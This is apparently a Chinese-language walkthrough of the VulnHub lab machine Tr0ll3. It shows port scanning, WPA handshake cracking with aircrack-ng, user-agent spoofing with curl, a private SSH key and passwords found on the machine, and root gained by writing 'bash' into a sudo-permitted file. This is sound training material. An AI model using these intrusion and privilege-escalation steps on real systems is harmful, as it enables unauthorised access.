# Troll 3

> https://download.vulnhub.com/tr0ll/Tr0ll3.ova
>
> ssh：`start:here`

靶场IP：`192.168.32.174`

![image-20220718141329252](../../.gitbook/assets/image-20220718141329252.png)

扫描对外端口

```
┌──(root💀kali)-[~/Desktop]
└─# nmap -p1-65535 192.168.32.174                                                                                                                                                                                                      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 02:13 EDT
Nmap scan report for 192.168.32.174
Host is up (0.00073s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:BB:B3:A9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds
```

直接SSH登录

![image-20220718141526812](../../.gitbook/assets/image-20220718141526812.png)

查看当前目录信息

```
start@Tr0ll3:~$ ls
bluepill  redpill
start@Tr0ll3:~$ cd bluepill/
start@Tr0ll3:~/bluepill$ ls
awesome_work
start@Tr0ll3:~/bluepill$ cat awesome_work 
http://bfy.tw/ODa
start@Tr0ll3:~/bluepill$ cd ~/redpill/
start@Tr0ll3:~/redpill$ ls
this_will_surely_work
start@Tr0ll3:~/redpill$ cat this_will_surely_work 
step2:Password1!
start@Tr0ll3:~/redpill$ 
```

该文件`awesome_work`只包含 URL http://bfy.tw/ODa。如果我们访问给定的链接，我们将被转发到_www.lmgtfy.com_（让我为你谷歌一下），并询问"你如何让黑客浪费时间"。所以很明显，这条线索是一条死胡同，被放在那里是开玩笑的。

随着故事的进展，我们一次又一次地看到类似的信息，只是为了分散注意力。这台机器名副其实，并在任何可能的地方"控制"我们。

`this_will_surely_work`目录中的文件`redpill`包含字符串`step2:Password1!`。我们的直觉告诉我们，这些必须是下一个凭据。但是如果我们尝试使用给定的信息登录，我们只会收到一条错误消息。再一次，这只是一个诱饵。

使用该命令`find / -type f -perm 0777 2>/dev/null`，我们可以列出所有用户都可以读取和编辑的文件，无论其所有者如何。这使我们能够识别第一个实际线索：

```
start@Tr0ll3:~/redpill$ find / -type f -perm 0777 2>/dev/null
/var/log/.dist-manage/wytshadow.cap
/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt
```

一方面，我们可以读取`wytshadow.cap`目录中的文件 `/var/log/.dist-manage/`。这似乎是对包括 WPA2 握手在内的网络流量的捕获。

下载到本地进行WIFI密码爆破

![image-20220718142025469](../../.gitbook/assets/image-20220718142025469.png)

```
aircrack-ng -w gold_star.txt wytshadow.cap
```

![image-20220718145030854](../../.gitbook/assets/image-20220718145030854.png)

wytshadow用户爆破出密码为`gaUoCe34t1`

```
start@Tr0ll3:/tmp$ su wytshadow
Password: 
wytshadow@Tr0ll3:/tmp$ id
uid=1003(wytshadow) gid=1003(wytshadow) groups=1003(wytshadow)
```

如果我们查看 的主目录`wytshadow`，该文件会`oohfun`立即引起我们的注意。该文件设置了 SUID 位，它允许我们以用户的权限运行程序`genphlux`。

```
wytshadow@Tr0ll3:~$ ls -al
total 40
drwx------  4 wytshadow wytshadow 4096 Aug  2  2019 .
drwxr-xr-x 10 root      root      4096 Jun 19  2015 ..
-rw-r--r--  1 wytshadow wytshadow  220 Jun 17  2015 .bash_logout
-rw-r--r--  1 wytshadow wytshadow 3637 Jun 17  2015 .bashrc
drwx------  2 wytshadow wytshadow 4096 Jun 17  2015 .cache
drwx------  3 wytshadow wytshadow 4096 Aug  1  2019 .gnupg
-rwsrwxrwx  1 genphlux  root      8566 Jun 17  2015 oohfun
-rw-r--r--  1 wytshadow wytshadow  675 Jun 17  2015 .profile
```

查看sudo列表

```
wytshadow@Tr0ll3:~$ sudo -l
[sudo] password for wytshadow: 
Matching Defaults entries for wytshadow on Tr0ll3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wytshadow may run the following commands on Tr0ll3:
    (root) /usr/sbin/service nginx start
```

然而，当我们实际运行时`oohfun`，我们只是不断地得到输出`iM Cr@zY L1k3 AAA LYNX`：

![image-20220718143138158](../../.gitbook/assets/image-20220718143138158.png)

如果我们使用 来检查文件内容`strings`，我们可以看到它包含以下行：

```
/lol/bin/run.sh -b 0.0.0.0
```

![image-20220718143216692](../../.gitbook/assets/image-20220718143216692.png)

```
wytshadow@Tr0ll3:~$ cat /lol/bin/run.sh
#!/bin/sh
while true;do echo "iM Cr@zY L1k3 AAA LYNX"; done
```

我们可以看到`wytshadow`允许用户启动nginx web server服务，这就是我们接下来要做的：

```
wytshadow@Tr0ll3:~$ sudo service nginx start
```

使用 对打开的端口进行本地检查以`netstat`确认 Web 服务器的成功启动。我们现在可以在端口 8080 上看到新服务。

![image-20220718143331983](../../.gitbook/assets/image-20220718143331983.png)

但是，我们无法访问 Web 服务，因为所有请求都被拒绝并显示`403 Forbidden`错误消息。

![image-20220718143415981](../../.gitbook/assets/image-20220718143415981.png)

为了缩小问题范围，我们打开文件`/etc/nginx/sites-ed/default`并查看 nginx Web 服务器的默认配置。一开始，我们注意到以下块：

```
server {
        listen 8080 default_server;
        listen [::]:8080 default_server;
            if ($http_user_agent !~ "Lynx*"){
                return 403;
}
```

如果请求不包含 user-agent `Lynx`，服务器将始终以 403 错误响应。由于该文件不幸是只读的，我们无法更改配置。但是，使用 curl 我们可以以预期的格式附加我们自己的用户代理标头。

```
┌──(root💀kali)-[~/Desktop]
└─# curl  -H "User-Agent: Lynx Basto"  http://192.168.32.174:8080
genphlux:HF9nd0cR!
```

```
wytshadow@Tr0ll3:~$ su genphlux
Password: 
genphlux@Tr0ll3:/home/wytshadow$ id
uid=1004(genphlux) gid=1004(genphlux) groups=1004(genphlux)
```

查看当前目录

```
genphlux@Tr0ll3:~$ ls -al
total 44
drwx------  4 genphlux genphlux 4096 Aug  2  2019 .
drwxr-xr-x 10 root     root     4096 Jun 19  2015 ..
-rw-r--r--  1 genphlux genphlux  220 Jun 17  2015 .bash_logout
-rw-r--r--  1 genphlux genphlux 3637 Jun 17  2015 .bashrc
drwx------  2 genphlux genphlux 4096 Jun 17  2015 .cache
drwx------  3 genphlux genphlux 4096 Aug  1  2019 .gnupg
-rw-rw-r--  1 genphlux genphlux 1675 Jun 18  2015 maleus
-rw-r--r--  1 genphlux genphlux  675 Jun 17  2015 .profile
-rw-------  1 genphlux genphlux 5649 Jun 17  2015 .viminfo
-rw-rw-r--  1 genphlux genphlux  931 Aug  2  2019 xlogin
```

该文件`xlogin`只是一个 HTML 页面，它是 web 目录的目录列表，对`/xlogin`我们没有任何帮助。

```
genphlux@Tr0ll3:~$ cat xlogin 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /xlogin</title>
 </head>
 <body>
<h1>Index of /xlogin</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="maleus">maleus</a></td><td align="right">2015-06-18 00:27  </td><td align="right">1.6K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 80</address>
</body></html>
```

相反，该文件`maleus`更有趣。它似乎包含一个 RSA 密钥，最有可能通过 SSH 连接。

```
genphlux@Tr0ll3:~$ cat maleus 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwz5Hwer48U1t/Qi9JveuO+Z7WQlnmhOOs/2pZ0he/OyVsEFv
DsGib1wu/N8t+7h9JZK9x2GL33TXQBVCy6TxES90F1An+2DSza6lJPCyhcgK/DEp
yxSVt32A+lFo+PQJV6QYZlpRkek0MjUw5y/E5qZwdBypC55C4QzgQBN3+Lnuhuk4
u52xcK9/6/2N7JZCNYA21Tp1Uy9mty/65IT7OwKJd2rXp3O6rZYTD/vPl+Rt/LtN
gA1DbDODq0NCmvcrZL+SafSj+MABA3LCERw01gA4RMdyxJU6hVfjeSKOdwDQOGWe
eAVCL2GR/frwyf+rfN1kbpdw/RGXWWwVANMcaQIDAQABAoIBAGNudFztrZo2NK2I
pcwSl0kqN+dAQuLU0vgXVw6ibL2iPxlkOYrqUi8kY0mk32YyrolUEhJYO0Ox3W1l
Zn8PoTV/VUAKMlJzHOhi6PfHHSPEnNOSthYWhajM4cKZczxWC+v2RfbaSHBms45e
SGl0inJskRiRAAZKswSp6gq334FrS6Dwy1tiKvzCfR3kLQghV5U/PhFZCsq3xvAw
eXPx2toNtU2gYSGrKWTep+nAKM1neBxeZAujYuN4xJ5/Th2y0pyTvX9WEgzKPJ/G
PlYZYCUAKPCbabYSuZckjeiN1aS52AIFedECBfAIezOr08Wx/bI/xCOgBxrQgPrK
kRvlOYECgYEA5eCIEfdLhWdg3ltadYE0O5VAoXKrbxYWqSyw1Eyeqj0N1qD9Rsvg
jIQJazV5JcVBIF54f/jlCJozR5s5AELrY0Z/krea1lF5ecOSUQE3tp94298xzO3g
7BBe3g6pD56Cya/Vo0+YVQmAnBHLh6QIYvUUXXN2IyceT8fhEx5JA+sCgYEA2W4z
KKMVAdPxKcjVks1zdGmVlj1RsUkakYuLWV3jQe2w1naJrc37Khy5eWZaRJhXqeBb
1cvTMa+r/BF7jvItxglWoBJqXDxKI0a6KqWtloZL2ynoaBkAhR2btob6nSN63Bpg
ZYJKY1B5yYbDHK4k6QT7atn2g6DAv/7sW6skj/sCgYA16WTAIek6TjZvr6kVacng
N27C7mu6T8ncvzhxcc68SjlWnscHtYTiL40t8YqKCyrs9nr4OF0umUtxfbvujcM6
syv0Ms9DeDQvFGjaSpjQYbIsjrnVP+zCMEyvc2y+1wQBXRWTiXVGbEYXVC0RkKzO
2H+AMzX/pIr9Vvk4TJ//JQKBgFNJcy9NyO46UVbAJ49kQ6WEDFjQhEp0xkiaO3aw
EC1g7yw3m+WH0X4AIsvt+QXtlSbtWkA7I1sU/7w+tiW7fu0tBpGqfDN4pK1+mjFb
5XKTXttE4lF9wkU7Yjo42ib3QEivkd1QW05PtVcM2BBUZK8dyXDUrSkemrbw33j9
xbOhAoGBAL8uHuAs68ki/BWcmWUUer7Y+77YI/FFm3EvP270K5yn0WUjDJXwHpuz
Fg3n294GdjBtQmvyf2Wxin4rxl+1aWuj7/kS1/Fa35n8qCN+lkBzfNVA7f626KRA
wS3CudSkma8StmvgGKIU5YcO8f13/3QB6PPBgNoKnF5BlFFQJqhK
-----END RSA PRIVATE KEY-----
```

现在我们尝试使用用户的私钥登录`maleus`。但是，SSH 服务禁止我们使用权限设置过宽的证书文件。因此，我们必须先提前缩小文件权限。

```
genphlux@Tr0ll3:~$ chmod 600 maleus 
genphlux@Tr0ll3:~$ ssh -i maleus maleus@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:RhN530LgY0ZFQupkWWarB5Fnx9EjijFyl3zOp3scJ30.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

New release '20.04.4 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

maleus@Tr0ll3:~$ 
```

我们也会被文件误导`dont_even_bother`。如果我们运行它，系统会提示我们输入密码。

![image-20220718144106828](../../.gitbook/assets/image-20220718144106828.png)

快速查看文件中`strings`包含的内容将显示所需的值：

```
xl8Fpx%6
```

![image-20220718144201726](../../.gitbook/assets/image-20220718144201726.png)

所以看起来我们仍然没有得到这个用户的任何地方。

![image-20220718144224699](../../.gitbook/assets/image-20220718144224699.png)

该文件`.viminfo`包含在 Vim 文本编辑器中键入的命令的历史记录。除其他外，该文件还包含以下摘录，其中似乎包括用户密码的输入：

```
maleus@Tr0ll3:~$ cat .viminfo 
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:wq
:q
:q!
:!shell

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:
""1     LINE    0
        passwd
"2      LINE    0
        B^slc8I$
"3      LINE    0
        passswd  

# File marks:

# Jumplist (newest first):

# History of marks within files (newest to oldest):

        +       25      62
```

查看sudo列表

```
maleus@Tr0ll3:~$ sudo -l
[sudo] password for maleus: 
Matching Defaults entries for maleus on Tr0ll3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User maleus may run the following commands on Tr0ll3:
    (root) /home/maleus/dont_even_bother
```

```
maleus@Tr0ll3:~$ echo "bash" > dont_even_bother
maleus@Tr0ll3:~$ sudo ./dont_even_bother
root@Tr0ll3:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Tr0ll3:~# cat /root/flag.txt 
You are truly a Jedi!

Twitter Proof:

Pr00fThatTh3L33tHax0rG0tTheFl@g!!

@Maleus21

```
